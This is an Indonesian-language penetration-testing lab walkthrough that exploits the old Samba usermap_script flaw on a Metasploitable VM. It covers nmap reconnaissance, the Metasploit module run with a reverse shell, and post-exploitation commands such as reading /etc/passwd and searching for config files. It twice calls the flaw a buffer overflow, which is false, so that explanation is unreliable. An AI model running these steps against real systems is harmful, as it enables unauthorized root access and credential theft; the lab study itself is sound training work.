# Introduction

**Samba** adalah seperangkat program sumber terbuka (_open source_) yang memungkinkan sistem Linux/Unix berinteraksi dengan jaringan yang **berbasis pada protokol SMB/CIFS** (_Server Message Block/Common Internet File System_), yang merupakan protokol standar untuk berbagi file dan printer di lingkungan Windows.

Secara sederhana, Samba bertindak sebagai "jembatan" atau "penerjemah" yang memungkinkan komputer Linux untuk berbagi file dan printer dengan komputer Windows seolah-olah komputer Linux tersebut adalah server Windows asli.

Kerentanan Samba _usermap_script_ adalah cacat _buffer overflow_ yang memungkinkan penyerang untuk mengeksekusi perintah dengan hak akses root tanpa otentikasi. Ini adalah salah satu kerentanan yang paling dicari karena dampaknya yang parah.

Apa itu **_Buffer Overflow_**? Ini adalah kondisi di mana sebuah program mencoba menulis data lebih banyak ke dalam suatu area memori (_buffer_) daripada yang bisa ditampung. Akibatnya, data tersebut meluber ke area memori di sekitarnya, yang bisa dimanfaatkan oleh penyerang untuk menyuntikkan dan menjalankan kode berbahaya mereka sendiri.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

Memindai port samba, yaitu 445 (SMB over TCP) dan 139 (NetBIOS-SSN) pada IP target
```
nmap -p 445,139 --script=smb-os-discovery <ip_metasploitable>
```
Script _smb-os-discovery_ digunakan untuk mendeteksi sistem operasi target, nama hostname, dan informasi domain/workgroup melalui protokol Samba.
```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:68:17:AC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-08-21T06:56:33-04:00
```
**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
```
search samba usermap
```

```
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

```
Modul _exploit/multi/samba/usermap_script_ akan mengirimkan payload yang telah dikonfigurasi ke server Samba, memanfaatkan _buffer overflow_ untuk mendapatkan shell dengan hak akses root.

Modul ini menargetkan kerentanan pada utilitas usermap di dalam Samba, yang secara spesifik ada di versi-versi lama Samba (seperti 3.0.20 hingga 3.0.25rc3).
- Memilih dan mengatur eksploitasi
```
use exploit/multi/samba/usermap_script
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
```

- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit
```

```
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 192.168.175.235:4444 
[*] Command shell session 1 opened (192.168.175.235:4444 -> 192.168.175.90:58041) at 2025-08-13 09:28:17 -0400

```
**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```
- Eksplorasi sistem
```
ls -l                    //melihat list file dan direktory
```
```
uname -a                 //melihat versi kernel dan informasi sistem
```
```
cat /etc/passwd          //melihat daftar user
```
```
find / -name "*.conf"    //mencari file sensitif
```
